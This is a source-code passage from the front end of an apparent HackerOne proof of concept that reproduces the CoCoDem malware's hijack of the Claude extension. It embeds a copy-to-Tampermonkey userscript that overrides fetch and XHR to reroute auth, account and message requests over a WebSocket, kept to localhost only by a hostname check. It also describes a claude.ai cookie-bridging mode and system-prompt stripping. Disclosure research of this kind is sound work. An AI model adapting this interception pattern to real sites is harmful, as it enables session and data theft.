            <div class="help-row"><span class="help-key">lm_studio</span><span class="help-val">Routes /v1/messages to http://localhost:1234/v1 (LM Studio default)</span></div>
            <div class="help-row"><span class="help-key">openrouter</span><span class="help-val">Requires OpenRouter API key, routes to api.openrouter.ai</span></div>
            <div class="help-row"><span class="help-key">anthropic</span><span class="help-val">Direct Anthropic API key — validates against BLOCKED_HOSTS first</span></div>
            <div class="help-row"><span class="help-key">custom</span><span class="help-val">Any OpenAI-compatible backend URL you specify</span></div>
          </div>
        </div>

        <div class="help-section">
          <div class="help-section-title">Auth modes</div>
          <div class="help-table">
            <div class="help-row"><span class="help-key">no_key</span><span class="help-val">No auth — completions use whatever backend is configured with no auth header</span></div>
            <div class="help-row"><span class="help-key">api_key</span><span class="help-val">x-api-key header injected from Worker A's stored api_key config</span></div>
            <div class="help-row"><span class="help-key">oauth</span><span class="help-val">Mock OAuth flow (local only, terminates at Worker A — no Anthropic contact)</span></div>
            <div class="help-row"><span class="help-key">cookie_bridge</span><span class="help-val">Worker C bridges cookies from claude.ai via /ws — closed-loop VDP demo only</span></div>
          </div>
        </div>

        <div class="help-section">
          <div class="help-section-title">System prompt mutation modes</div>
          <div class="help-table">
            <div class="help-row"><span class="help-key">strip_replace</span><span class="help-val">Strips any system prompt from the request and replaces with configured override (or nothing)</span></div>
            <div class="help-row"><span class="help-key">prepend</span><span class="help-val">Prepends configured override to the existing system prompt</span></div>
            <div class="help-row"><span class="help-key">append</span><span class="help-val">Appends configured override after the existing system prompt</span></div>
          </div>
        </div>

        <div class="help-section">
          <div class="help-section-title">Keyboard shortcuts</div>
          <div class="help-table">
            \${[
              ['Ctrl+K',       'Command palette'],
              ['Ctrl+Shift+O', 'New conversation'],
              ['Ctrl+,',       'Settings'],
              ['Ctrl+E',       'Export current conversation'],
              ['Ctrl+Shift+M', 'Memory panel'],
              ['Ctrl+Shift+P', 'Projects panel'],
              ['Ctrl+Shift+U', 'Usage analytics'],
              ['Ctrl+Shift+B', 'Backup all data'],
              ['F1',           'Help'],
            ].map(([k, d]) => \`<div class="help-row"><span class="help-key">\${k}</span><span class="help-val">\${d}</span></div>\`).join('')}
          </div>
        </div>

        <div class="help-section">
          <div class="help-section-title">Quick reference: Worker A endpoints used by Worker B</div>
          <div style="font-family:var(--font-mono);font-size:11px;color:var(--text2);line-height:2;">
            POST /auth/login, /auth/signup<br>
            GET  /health, /diag, /bootstrap<br>
            GET/POST /api/organizations/*/chat_conversations*<br>
            POST /v1/messages (SSE streaming)<br>
            GET/POST/DELETE /memory, /drafts, /quick_actions, /notifications<br>
            GET  /bridge/usage_timeline, /bridge/config<br>
            WS   /ws (Worker C bridge)
          </div>
        </div>
      </div>
    </div>\`;

    modal.classList.add('open');
  },
};

(function injectHelpCSS() {
  const s = document.createElement('style');
  s.textContent = \`
    .help-section{margin-bottom:20px;}
    .help-section-title{font-size:11px;letter-spacing:.08em;text-transform:uppercase;color:var(--accent);padding-bottom:6px;border-bottom:1px solid var(--accent-dim);margin-bottom:10px;font-family:var(--font-mono);}
    .help-diagram{background:var(--surface2);border:1px solid var(--border);border-radius:3px;padding:12px;font-family:var(--font-mono);font-size:11px;}
    .help-diagram-row{display:flex;align-items:center;gap:8px;}
    .help-node{padding:4px 10px;border-radius:2px;font-weight:700;white-space:nowrap;}
    .help-node.wb{background:var(--blue-dim);border:1px solid var(--blue);color:var(--blue);}
    .help-node.wa{background:var(--accent-dim);border:1px solid var(--accent);color:var(--accent);}
    .help-node.be{background:var(--green-dim);border:1px solid var(--green);color:var(--green);}
    .help-node.wc{background:var(--purple);border:1px solid var(--purple);color:#fff;opacity:.8;}
    .help-arrow{color:var(--text3);flex-shrink:0;}
    .help-table{display:flex;flex-direction:column;gap:4px;}
    .help-row{display:flex;gap:8px;font-size:12px;padding:4px 0;border-bottom:1px solid var(--border);}
    .help-key{font-family:var(--font-mono);font-size:11px;color:var(--accent);min-width:120px;flex-shrink:0;padding:1px 0;}
    .help-val{color:var(--text2);line-height:1.5;}
  \`;
  document.head.appendChild(s);
})();

// Register F1 for help, add help button to topbar
Shortcuts.register('f1', () => Help.open());

(function addHelpBtn() {
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', addHelpBtn);
    return;
  }
  const topbar = document.querySelector('.topbar');
  if (!topbar) return;
  const helpBtn = document.createElement('button');
  helpBtn.className = 'btn-icon';
  helpBtn.title     = 'Help (F1)';
  helpBtn.textContent = '?';
  helpBtn.onclick   = () => Help.open();
  topbar.appendChild(helpBtn);
})();

// ================================================================
// DIAG DASHBOARD — see Worker A internal state
// ================================================================

const DiagDashboard = {
  open() {
    let modal = document.getElementById('diag-modal');
    if (!modal) {
      modal = document.createElement('div');
      modal.id        = 'diag-modal';
      modal.className = 'modal-overlay';
      document.body.appendChild(modal);
      modal.addEventListener('click', e => { if (e.target === modal) modal.classList.remove('open'); });
    }

    modal.innerHTML = \`<div class="modal" style="max-width:560px">
      <div class="modal-header">
        <span class="modal-title">🔬 Worker A diagnostics</span>
        <button class="btn-icon" onclick="document.getElementById('diag-modal').classList.remove('open')">✕</button>
      </div>
      <div class="modal-body" id="diag-body">
        <div class="loader"><span></span><span></span><span></span></div>
      </div>
    </div>\`;

    modal.classList.add('open');

    Promise.all([API._json('/diag'), API._json('/health')]).then(([diag, health]) => {
      const body = document.getElementById('diag-body');
      if (!body) return;

      const cfg = diag.config || {};
      body.innerHTML = \`
        <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:14px;">
          <div class="diag-stat"><span class="diag-stat-label">Conversations</span><span class="diag-stat-val">\${diag.conversations || 0}</span></div>
          <div class="diag-stat"><span class="diag-stat-label">Request count</span><span class="diag-stat-val">\${diag.requestCount || 0}</span></div>
          <div class="diag-stat"><span class="diag-stat-label">Uptime</span><span class="diag-stat-val">\${diag.uptimeSeconds ? Math.floor(diag.uptimeSeconds / 60) + 'm' : '—'}</span></div>
          <div class="diag-stat"><span class="diag-stat-label">Worker C connected</span><span class="diag-stat-val" style="color:\${diag.active_ws ? 'var(--green)' : 'var(--red)'}">\${diag.active_ws ? '✓ Yes' : '✗ No'}</span></div>
        </div>
        <div style="font-size:11px;font-family:var(--font-mono);background:var(--surface2);border:1px solid var(--border);border-radius:3px;padding:10px;color:var(--text2);line-height:2;">
          <div><span style="color:var(--accent)">backend</span>: \${cfg.backend || '—'}</div>
          <div><span style="color:var(--accent)">auth_mode</span>: \${cfg.auth_mode || '—'}</div>
          <div><span style="color:var(--accent)">model</span>: \${cfg.default_model || '—'}</div>
          <div><span style="color:var(--accent)">mutation</span>: \${cfg.mutation_mode || '—'}</div>
          <div><span style="color:var(--accent)">backend_url</span>: \${cfg.backend_url || '(default)'}</div>
          <div><span style="color:var(--accent)">version</span>: \${diag.version || health.version || '—'}</div>
          \${diag.lastError ? \`<div style="color:var(--red)"><span>lastError</span>: \${ConvList.esc(diag.lastError)}</div>\` : ''}
        </div>
        <div id="rl-panel" style="margin-top:14px;"></div>
      \`;

      RateLimitDisplay.load();
    }).catch(e => {
      const body = document.getElementById('diag-body');
      if (body) body.innerHTML = \`<div class="red">Failed to load diagnostics: \${ConvList.esc(e.message)}</div>\`;
    });
  },
};

(function injectDiagCSS() {
  const s = document.createElement('style');
  s.textContent = \`
    .diag-stat{background:var(--surface2);border:1px solid var(--border);border-radius:3px;padding:8px 12px;}
    .diag-stat-label{display:block;font-size:10px;color:var(--text2);text-transform:uppercase;letter-spacing:.05em;font-family:var(--font-mono);}
    .diag-stat-val{display:block;font-size:18px;font-weight:700;color:var(--text);margin-top:2px;font-family:var(--font-mono);}
  \`;
  document.head.appendChild(s);
})();

// Wire "Worker A health" command to diag dashboard
CommandPalette._commands?.push?.({ id: 'diag', icon: '🔬', label: 'Diagnostics dashboard', desc: 'Worker A internal state', fn: () => DiagDashboard.open() });

// ================================================================
// ENHANCED MARKDOWN — extend with more rendering patterns
// ================================================================

const _prevMarkdownRender = Markdown.render.bind(Markdown);
Markdown.render = function(text) {
  if (!text) return '';

  // Pre-process: handle task lists
  text = text
    .replace(/^- \\[x\\] (.+)$/gmi, '<li class="task-done">☑ $1</li>')
    .replace(/^- \\[ \\] (.+)$/gmi, '<li class="task-todo">☐ $1</li>');

  // Handle definition lists  \`: term\`
  // (simplistic — just style any bold-colon pattern)
  text = text.replace(/\\*\\*([^:*]+):\\*\\*/g, '<dt>$1:</dt>');

  let result = _prevMarkdownRender(text);

  // Post-process: add task list classes
  result = result.replace(/<li class="task-done">/g, '<li style="list-style:none;color:var(--green)">');
  result = result.replace(/<li class="task-todo">/g, '<li style="list-style:none;color:var(--text2)">');

  return result;
};

// Add markdown CSS enhancements
(function() {
  const s = document.createElement('style');
  s.textContent = \`
    .msg-content details{background:var(--surface2);border:1px solid var(--border);border-radius:3px;padding:6px 10px;margin:8px 0;}
    .msg-content details summary{cursor:pointer;font-weight:600;color:var(--text);}
    .msg-content details[open] summary{color:var(--accent);}
    .msg-content dt{font-weight:700;color:var(--text);margin-top:6px;}
    .msg-content kbd{font-family:var(--font-mono);font-size:11px;background:var(--surface3);border:1px solid var(--border2);border-radius:2px;padding:1px 5px;}
    .msg-content mark{background:rgba(232,144,58,.2);color:var(--accent);padding:1px 3px;border-radius:2px;}
    .msg-content sup{font-size:10px;vertical-align:super;}
    .msg-content sub{font-size:10px;vertical-align:sub;}
  \`;
  document.head.appendChild(s);
})();

// ================================================================
// CONVERSATION SEARCH WITH HIGHLIGHT
// ================================================================

const ConvSearch = {
  _term: '',

  highlight(container, term) {
    if (!term) return;
    ConvSearch._term = term;
    const walker = document.createTreeWalker(container, NodeFilter.SHOW_TEXT);
    const toWrap = [];
    let   node;
    while ((node = walker.nextNode())) {
      const idx = node.textContent.toLowerCase().indexOf(term.toLowerCase());
      if (idx >= 0 && !node.parentNode.classList.contains('search-highlight')) {
        toWrap.push({ node, idx, term: node.textContent.slice(idx, idx + term.length) });
      }
    }
    for (const { node, idx, term: matchText } of toWrap.reverse()) {
      const range = document.createRange();
      range.setStart(node, idx);
      range.setEnd(node, idx + matchText.length);
      const span = document.createElement('mark');
      span.className = 'search-highlight';
      span.style.cssText = 'background:rgba(232,144,58,.35);color:var(--accent);padding:0 2px;border-radius:2px;';
      try { range.surroundContents(span); } catch {}
    }
  },

  clear(container) {
    container.querySelectorAll('.search-highlight').forEach(el => {
      const parent = el.parentNode;
      parent.replaceChild(document.createTextNode(el.textContent), el);
      parent.normalize();
    });
    ConvSearch._term = '';
  },
};

// ================================================================
// RESPONSIVE / MOBILE TWEAKS
// ================================================================

(function injectResponsiveCSS() {
  const s = document.createElement('style');
  s.textContent = \`
    @media (max-width: 768px) {
      :root { --sidebar-w: 0px; --artifact-w: 0px; }
      .sidebar { display: none; }
      .artifact-panel { display: none; }
      .resize-handle { display: none; }
      .topbar { padding: 0 8px; gap: 4px; }
      .topbar-brand { display: none; }
      .input-area { padding: 8px; }
      .msg { padding: 8px 12px; }
    }
    @media (max-width: 480px) {
      .msg-avatar { display: none; }
      .input-toolbar { flex-wrap: wrap; gap: 4px; }
    }
    @media (prefers-reduced-motion: reduce) {
      *, *::before, *::after { animation-duration: 0.01ms !important; transition-duration: 0.01ms !important; }
    }
  \`;
  document.head.appendChild(s);
})();

// ================================================================
// ACCESSIBILITY ENHANCEMENTS
// ================================================================

(function a11y() {
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', a11y);
    return;
  }

  // Add skip-to-content link
  const skip = document.createElement('a');
  skip.href      = '#messages';
  skip.className = 'sr-only';
  skip.textContent = 'Skip to content';
  skip.style.cssText = 'position:fixed;top:4px;left:4px;z-index:9999;background:var(--accent);color:#0c0c10;padding:6px 12px;border-radius:3px;font-size:12px;';
  skip.onfocus = () => skip.style.clip = 'auto';
  skip.onblur  = () => skip.style.clip = 'rect(0,0,0,0)';
  document.body.prepend(skip);

  // ARIA labels
  const sidebar = document.getElementById('sidebar');
  if (sidebar) sidebar.setAttribute('role', 'navigation');
  const messages = document.getElementById('messages');
  if (messages) { messages.setAttribute('role', 'log'); messages.setAttribute('aria-live', 'polite'); }
  const input = document.getElementById('msg-input');
  if (input) { input.setAttribute('aria-label', 'Chat message input'); }
  const sendBtn = document.getElementById('send-btn');
  if (sendBtn) sendBtn.setAttribute('aria-label', 'Send message');
})();

// ================================================================
// WORKER B READY — expose useful globals for Worker C interaction
// ================================================================

// Worker C (the userscript) can use these globals to interact with Worker B
window.__workerB = {
  version:     '1.0.0',
  getState:    () => ({ convId: State.currentConvId, model: State.config.model, streaming: State.isStreaming }),
  getWorkerAUrl: () => State.workerAUrl,
  getToken:    () => State.token,
  notifyIntercept: (msg) => {
    // Worker C calls this to confirm it intercepted a request
    Toast.info('Worker C: ' + msg);
    const pill = document.getElementById('wc-status-pill');
    if (pill) { pill.textContent = 'W-C ✓'; pill.className = 'pill pill-ok'; }
  },
  onMessage: (msg) => {
    // Worker C can deliver messages into the chat
    if (msg.type === 'completion_response' && msg.text) {
      Toast.info('Worker C delivered response');
    }
  },
};

// Log ready state
console.log('[Worker B] Initialized. Worker A URL:', State.workerAUrl);
console.log('[Worker B] window.__workerB available for Worker C interaction.');

// ================================================================
// WORKER C REFERENCE TEMPLATE
// Shown inside Worker B as a copy-to-Tampermonkey guide.
// @match targets localhost ONLY — never real Anthropic infrastructure.
// This is a VDP research artifact for the HackerOne submission.
// ================================================================

const WorkerCTemplate = {
  // The canonical Worker C userscript template.
  // @match is hardcoded to localhost — closed-loop enforcement at the template level.
  _getScript() {
    const wsUrl = State.workerAUrl.replace('http://', 'ws://').replace('https://', 'wss://') + '/ws';
    return \`// ==UserScript==
// @name         Sister PoC — Worker C (Fetch Interceptor)
// @namespace    sister-poc-vdp
// @version      1.0.0
// @description  Closed-loop fetch-hijack demonstrator for Anthropic HackerOne VDP.
//               Intercepts Worker B fetch calls and bridges through Worker A WS.
//               CLOSED LOOP ONLY — @match enforces localhost-only operation.
// @author       Operator
// @match        http://127.0.0.1:*/*
// @match        http://localhost:*/*
// @grant        none
// @run-at       document-start
// ==/UserScript==

// !! VDP RESEARCH ARTIFACT — SINGLE OPERATOR, LOCALHOST ONLY !!
// This script demonstrates the same fetch-hijack pattern used by the
// CoCoDem malware (request.js) against the real Claude extension.
// Here it operates entirely within a closed loop:
//   Worker B (this page) → [Worker C intercepts] → Worker A WS → Backend
// No real Anthropic infrastructure is contacted.
// ================================================================

(function() {
  'use strict';

  const WORKER_A_WS = '__INJECT_WS_URL__';
  const WORKER_B_ID = 'sister-poc-worker-b';

  // ── Intercept targets (mirrors CoCoDem proxyIncludes pattern) ──
  // In CoCoDem, these routes were forwarded to openclaude.111724.xyz.
  // Here they're forwarded to Worker A on localhost. The key architectural
  // difference: attacker-controlled vs operator-controlled infrastructure.
  const INTERCEPT_PATHS = [
    '/api/organizations/',
    '/api/account',
    '/api/bootstrap',
    '/auth/',
    '/v1/messages',
    '/v1/models',
    '/notifications',
    '/quick_actions',
    '/memory',
    '/drafts',
  ];

  // ── WS bridge to Worker A ──────────────────────────────────────
  let ws = null;
  let pendingRequests = new Map(); // requestId → { resolve, reject }
  let connected = false;
  let reconnectTimer = null;

  function connectWS() {
    if (ws && ws.readyState === WebSocket.OPEN) return;

    try {
      ws = new WebSocket(WORKER_A_WS);

      ws.onopen = () => {
        connected = true;
        console.log('[Worker C] Connected to Worker A WS');
        // Notify Worker B
        window.__workerB?.notifyIntercept('Worker C connected via WS');
        // Send identification
        ws.send(JSON.stringify({ type: 'identify', client: WORKER_B_ID, version: '1.0.0' }));
      };

      ws.onmessage = (e) => {
        let msg;
        try { msg = JSON.parse(e.data); } catch { return; }

        if (msg.type === 'response' && msg.requestId) {
          const pending = pendingRequests.get(msg.requestId);
          if (pending) {
            pendingRequests.delete(msg.requestId);
            pending.resolve(msg);
          }
        } else if (msg.type === 'push') {
          // Worker A pushing a notification down
          window.__workerB?.onMessage(msg);
        }
      };

      ws.onerror = () => { connected = false; };
      ws.onclose = () => {
        connected = false;
        // Reconnect after 3 seconds
        if (!reconnectTimer) {
          reconnectTimer = setTimeout(() => { reconnectTimer = null; connectWS(); }, 3000);
        }
      };
    } catch (e) {
      console.warn('[Worker C] WS connection failed:', e.message);
    }
  }

  // ── Original fetch saved before override ──────────────────────
  const _originalFetch = window.fetch.bind(window);
  const _originalXHROpen = XMLHttpRequest.prototype.open;

  // ── Helper: should we intercept this URL? ─────────────────────
  function shouldIntercept(url) {
    try {
      const u = new URL(url, window.location.href);
      // Only intercept calls to Worker A on localhost — this is the key constraint
      // that keeps us inside the closed loop
      if (!u.hostname.includes('127.0.0.1') && !u.hostname.includes('localhost')) {
        return false;
      }
      return INTERCEPT_PATHS.some(p => u.pathname.startsWith(p));
    } catch {
      return false;
    }
  }

  // ── fetch override ─────────────────────────────────────────────
  // This is the architectural parallel to CoCoDem's globalThis.fetch override.
  // CoCoDem: intercepts → forwards to openclaude.111724.xyz (attacker server)
  // Worker C: intercepts → forwards to Worker A WS on localhost (operator server)
  window.fetch = async function(input, init = {}) {
    const url = typeof input === 'string' ? input : (input instanceof URL ? input.toString() : input.url);

    if (!shouldIntercept(url)) {
      // Not our intercept path — use original fetch
      return _originalFetch(input, init);
    }

    console.log('[Worker C] Intercepting fetch:', url);

    // If WS is connected, demonstrate the bridge — otherwise fall through
    if (connected && ws?.readyState === WebSocket.OPEN) {
      const requestId  = 'wc_' + Date.now() + '_' + Math.random().toString(36).slice(2);
      const bodyText   = init.body ? (typeof init.body === 'string' ? init.body : JSON.stringify(init.body)) : null;

      // Package the request and send over WS
      const bridgeMsg = {
        type:       'fetch_request',
        requestId,
        url,
        method:     init.method || 'GET',
        headers:    Object.fromEntries(new Headers(init.headers || {})),
        body:       bodyText,
        timestamp:  Date.now(),
      };

      ws.send(JSON.stringify(bridgeMsg));

      // Wait for response (5s timeout)
      try {
        const response = await Promise.race([
          new Promise((resolve, reject) => {
            pendingRequests.set(requestId, { resolve, reject });
          }),
          new Promise((_, reject) => setTimeout(() => reject(new Error('WS timeout')), 5000)),
        ]);

        // Reconstruct a Response from the WS bridge response
        const responseBody = response.body ?? '';
        const status       = response.status ?? 200;
        const headers      = new Headers(response.headers ?? {});
        return new Response(typeof responseBody === 'string' ? responseBody : JSON.stringify(responseBody), { status, headers });
      } catch (e) {
        console.warn('[Worker C] WS bridge timeout, falling through to direct fetch:', e.message);
        // Fallthrough to direct fetch on timeout
      }
    }

    // WS not available or timed out — use original fetch directly to Worker A
    return _originalFetch(input, init);
  };

  // ── XHR override ───────────────────────────────────────────────
  // Mirror of CoCoDem's XMLHttpRequest.prototype.open override.
  // We override but only log — XHR interception for the demo shows
  // the pattern without needing full XHR proxying via WS.
  XMLHttpRequest.prototype.open = function(method, url, ...args) {
    if (shouldIntercept(String(url))) {
      console.log('[Worker C] XHR intercepted:', method, url);
    }
    return _originalXHROpen.apply(this, [method, url, ...args]);
  };

  // ── Connect to Worker A ────────────────────────────────────────
  connectWS();

  console.log('[Worker C] Initialized. Monitoring fetch calls on:', window.location.origin);
  console.log('[Worker C] WS bridge target:', WORKER_A_WS);
  console.log('[Worker C] Intercept paths:', INTERCEPT_PATHS.length, 'patterns');

})();\`;
  },

  open() {
    let modal = document.getElementById('worker-c-script-modal');
    if (!modal) {
      modal = document.createElement('div');
      modal.id        = 'worker-c-script-modal';
      modal.className = 'modal-overlay';
      document.body.appendChild(modal);
      modal.addEventListener('click', e => { if (e.target === modal) modal.classList.remove('open'); });
    }

    const script = WorkerCTemplate._getScript();

    modal.innerHTML = \`<div class="modal" style="max-width:680px;max-height:85vh;display:flex;flex-direction:column">
      <div class="modal-header" style="flex-shrink:0">
        <span class="modal-title">📋 Worker C — Tampermonkey Script</span>
        <button class="btn-icon" onclick="document.getElementById('worker-c-script-modal').classList.remove('open')">✕</button>
      </div>
      <div style="padding:10px 18px;flex-shrink:0;background:var(--accent-dim);border-bottom:1px solid var(--accent)">
        <div style="font-size:11px;color:var(--accent);font-family:var(--font-mono);line-height:1.6">
          ⚠ VDP RESEARCH ARTIFACT — CLOSED LOOP ONLY<br>
          @match enforces localhost-only. Never run against real claude.ai. HackerOne VDP submission artifact only.
        </div>
      </div>
      <div style="flex:1;overflow-y:auto;padding:0">
        <pre id="worker-c-script-pre" style="font-family:var(--font-mono);font-size:11px;padding:14px 18px;color:var(--text);white-space:pre-wrap;word-break:break-word;line-height:1.6;margin:0">\${ConvList.esc(script)}</pre>
      </div>
      <div class="modal-footer" style="flex-shrink:0">
        <button class="btn btn-ghost" onclick="document.getElementById('worker-c-script-modal').classList.remove('open')">Close</button>
        <button class="btn btn-accent" onclick="WorkerCTemplate.copyScript()">⎘ Copy to clipboard</button>
      </div>
    </div>\`;

    modal.classList.add('open');
  },

  copyScript() {
    const script = WorkerCTemplate._getScript();
    navigator.clipboard.writeText(script)
      .then(() => Toast.ok('Worker C script copied — paste into Tampermonkey'))
      .catch(() => Toast.err('Copy failed — select the script text manually'));
  },
};

// Wire Worker C template button into the setup panel
const _origWCPanelOpen = WorkerCPanel.open.bind(WorkerCPanel);
WorkerCPanel.open = function() {
  _origWCPanelOpen();
  // Delay to ensure modal is rendered
  setTimeout(() => {
    const body = document.querySelector('#worker-c-modal .modal-body');
    if (body) {
      const showScriptBtn = document.createElement('button');
      showScriptBtn.className = 'btn btn-accent btn-sm';
      showScriptBtn.style.marginTop = '14px';
      showScriptBtn.style.width     = '100%';
      showScriptBtn.style.justifyContent = 'center';
      showScriptBtn.textContent = '📋 Show Worker C script (copy to Tampermonkey)';
      showScriptBtn.onclick     = () => WorkerCTemplate.open();
      body.appendChild(showScriptBtn);
    }
  }, 50);
};

// Add Worker C to command palette
document.addEventListener('DOMContentLoaded', () => {
  // Extend the Shortcuts handler with Worker C
  Shortcuts.register('ctrl+shift+c', () => WorkerCPanel.open());
});

// ================================================================
// REACTION SYSTEM UI — emoji reactions on messages
// ================================================================

const ReactionUI = {
  _COMMON_EMOJI: ['👍', '❤️', '😄', '🔥', '✅', '🤔', '👎', '💯'],

  addPicker(msgEl, msgId) {
    const existing = msgEl.querySelector('.reaction-bar');
    if (!existing) {
      const bar = document.createElement('div');
      bar.className = 'reaction-bar';
      bar.innerHTML = ReactionUI._COMMON_EMOJI.map(e =>
        \`<button class="reaction-btn" title="\${e}" onclick="ReactionUI.react('\${msgId}','\${e}',this)">\${e}</button>\`
      ).join('');
      msgEl.querySelector('.msg-body')?.appendChild(bar);
    }
  },

  async react(msgId, emoji, btn) {
    try {
      const resp = await API._json('/api/organizations/ORG/messages/' + msgId + '/reactions', {
        method: 'POST', body: JSON.stringify({ emoji }),
      });
      // Render counts
      const reactions = resp.reactions || [];
      const target    = btn.closest('.msg');
      let display     = target?.querySelector('.reactions-display');
      if (!display) {
        display = document.createElement('div');
        display.className = 'reactions-display';
        target?.querySelector('.msg-body')?.appendChild(display);
      }
      display.innerHTML = reactions.map(r =>
        \`<span class="reaction-chip">\${r.emoji} <span>\${r.count}</span></span>\`
      ).join('');
    } catch {}
  },
};

(function injectReactionCSS() {
  const s = document.createElement('style');
  s.textContent = \`
    .reaction-bar{display:flex;flex-wrap:wrap;gap:3px;margin-top:6px;opacity:0;transition:opacity .15s;}
    .msg:hover .reaction-bar{opacity:1;}
    .reaction-btn{background:none;border:1px solid var(--border);border-radius:2px;padding:1px 4px;font-size:13px;cursor:pointer;transition:border-color .15s;}
    .reaction-btn:hover{border-color:var(--accent);}
    .reactions-display{display:flex;flex-wrap:wrap;gap:4px;margin-top:4px;}
    .reaction-chip{display:inline-flex;align-items:center;gap:2px;padding:1px 6px;background:var(--surface2);border:1px solid var(--border);border-radius:10px;font-size:12px;color:var(--text2);}
  \`;
  document.head.appendChild(s);
})();

// ================================================================
// SYSTEM PROMPT EDITOR — inline in the input toolbar
// ================================================================

const SystemPromptEditor = {
  _currentPrompt: '',

  open() {
    let modal = document.getElementById('sp-editor-modal');
    if (!modal) {
      modal = document.createElement('div');
      modal.id        = 'sp-editor-modal';
      modal.className = 'modal-overlay';
      document.body.appendChild(modal);
      modal.addEventListener('click', e => { if (e.target === modal) modal.classList.remove('open'); });
    }

    modal.innerHTML = \`<div class="modal" style="max-width:560px">
      <div class="modal-header">
        <span class="modal-title">📝 System prompt override</span>
        <button class="btn-icon" onclick="document.getElementById('sp-editor-modal').classList.remove('open')">✕</button>
      </div>
      <div class="modal-body">
        <p style="font-size:12px;color:var(--text2);margin-bottom:10px;line-height:1.6">
          Override the system prompt for this conversation.
          Mutation mode (<strong style="color:var(--accent)">\${State.config.mutation_mode}</strong>) controls how this interacts with any existing system prompt.
        </p>
        <div class="settings-field">
          <label>Mode: <strong style="color:var(--accent)">\${State.config.mutation_mode}</strong> — <span style="color:var(--text3)">\${
            State.config.mutation_mode === 'strip_replace' ? 'Strips existing prompt and replaces with this' :
            State.config.mutation_mode === 'prepend' ? 'Prepends this before any existing prompt' :
            'Appends this after any existing prompt'
          }</span></label>
          <textarea id="sp-editor-textarea" style="width:100%;min-height:200px;font-family:var(--font-mono);font-size:12px" placeholder="Enter system prompt override…\\n\\nLeave blank to disable the override.">\${ConvList.esc(SystemPromptEditor._currentPrompt)}</textarea>
        </div>
        <div class="help-table" style="margin-top:10px">
          <div class="help-row"><span class="help-key">strip_replace</span><span class="help-val">Full control over what the model sees as instructions</span></div>
          <div class="help-row"><span class="help-key">prepend</span><span class="help-val">Add context before the app's default prompt</span></div>
          <div class="help-row"><span class="help-key">append</span><span class="help-val">Add post-instructions after the default prompt</span></div>
        </div>
      </div>
      <div class="modal-footer">
        <button class="btn btn-ghost" onclick="document.getElementById('sp-editor-modal').classList.remove('open')">Cancel</button>
        <button class="btn btn-ghost btn-sm" onclick="document.getElementById('sp-editor-textarea').value='';SystemPromptEditor._currentPrompt=''" style="color:var(--red)">Clear</button>
        <button class="btn btn-accent" onclick="SystemPromptEditor.save()">Apply</button>
      </div>
    </div>\`;

    modal.classList.add('open');
    setTimeout(() => document.getElementById('sp-editor-textarea')?.focus(), 100);
  },

  async save() {
    const text = document.getElementById('sp-editor-textarea')?.value || '';
    SystemPromptEditor._currentPrompt = text;
    try {
      await API.saveConfig({ system_prompt_override: text });
      document.getElementById('sp-editor-modal')?.classList.remove('open');
      Toast.ok(text ? 'System prompt override set' : 'System prompt override cleared');
    } catch (e) {
      Toast.err('Failed: ' + e.message);
    }
  },
};

// Add system prompt button to input toolbar
(function addSystemPromptBtn() {
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', addSystemPromptBtn);
    return;
  }
  const toolbar = document.querySelector('.input-toolbar');
  if (!toolbar) return;
  const spBtn = document.createElement('button');
  spBtn.className = 'btn-icon';
  spBtn.title     = 'Edit system prompt override';
  spBtn.textContent = '📝';
  spBtn.onclick   = () => SystemPromptEditor.open();
  toolbar.appendChild(spBtn);
})();

// ================================================================
// AUTO-TITLE GENERATION — set conversation name from first message
// ================================================================

const AutoTitle = {
  async generate(convId, firstMessage) {
    // Use Worker A to generate a title by asking the model to summarize
    const title = firstMessage.slice(0, 60).replace(/\\n/g, ' ').trim();
    const conv  = State.conversations.get(convId);
    if (!conv || conv.name) return;  // Don't overwrite existing title
    conv.name = title;
    persistConversation(conv);
    if (convId === State.currentConvId) {
      document.getElementById('conv-title').textContent = title;
    }
    ConvList.render();
    // Async: try to get a better title from Worker A
    try {
      await API.renameConv(convId, title);
    } catch {}
  },
};

// ================================================================
// TOKEN BUDGET DISPLAY — visible progress bar above messages
// ================================================================

const TokenBudget = {
  _maxContext: 200000,
  _used:       0,

  update(inputTokens, outputTokens) {
    TokenBudget._used = (inputTokens || 0) + (outputTokens || 0);
    TokenBudget.render();
  },

  render() {
    let bar = document.getElementById('token-budget-bar');
    if (!bar) {
      bar = document.createElement('div');
      bar.id        = 'token-budget-bar';
      bar.style.cssText = 'height:2px;background:var(--surface3);flex-shrink:0;position:relative;overflow:hidden;';
      const fill = document.createElement('div');
      fill.id       = 'token-budget-fill';
      fill.style.cssText = 'height:100%;width:0%;background:var(--accent);transition:width .5s;';
      bar.appendChild(fill);
      // Insert above messages
      const wrapper = document.getElementById('messages-wrapper');
      if (wrapper) wrapper.prepend(bar);
    }

    const pct  = Math.min(100, Math.round(TokenBudget._used / TokenBudget._maxContext * 100));
    const fill = document.getElementById('token-budget-fill');
    if (fill) {
      fill.style.width      = pct + '%';
      fill.style.background = pct > 85 ? 'var(--red)' : pct > 60 ? 'var(--accent)' : 'var(--green)';
    }
    bar.title = \`~\${TokenBudget._used.toLocaleString()} / \${TokenBudget._maxContext.toLocaleString()} context tokens used (\${pct}%)\`;
  },
};

// Wire token budget into the SSE consumer's onDone
const _origSend2 = App.send.bind(App);
App.send = async function() {
  // Capture the original onDone and patch token budget
  const origConsume = SSE.consume.bind(SSE);
  const patchedConsume = async (response, handlers) => {
    const origOnDone = handlers.onDone;
    handlers.onDone = (result) => {
      TokenBudget.update(result.inputTokens, result.outputTokens);
      origOnDone?.(result);
    };
    return origConsume(response, handlers);
  };
  // Temporarily replace SSE.consume
  const saved = SSE.consume;
  SSE.consume = patchedConsume;
  await _origSend2();
  SSE.consume = saved;
};

// ================================================================
// POLISHED LOADING STATES
// ================================================================

(function injectLoadingStateCSS() {
  const s = document.createElement('style');
  s.textContent = \`
    .loading-shimmer{background:linear-gradient(90deg,var(--surface2) 25%,var(--surface3) 50%,var(--surface2) 75%);background-size:200% 100%;animation:shimmer 1.5s infinite;}
    @keyframes shimmer{0%{background-position:200% 0}100%{background-position:-200% 0}}
    .msg.streaming .msg-content{min-height:20px;}
    .conv-item{animation:fade-in .15s ease;}
    @keyframes fade-in{from{opacity:0;transform:translateY(-4px)}to{opacity:1;transform:translateY(0)}}
    .toast{animation:toast-in .2s cubic-bezier(.34,1.56,.64,1);}
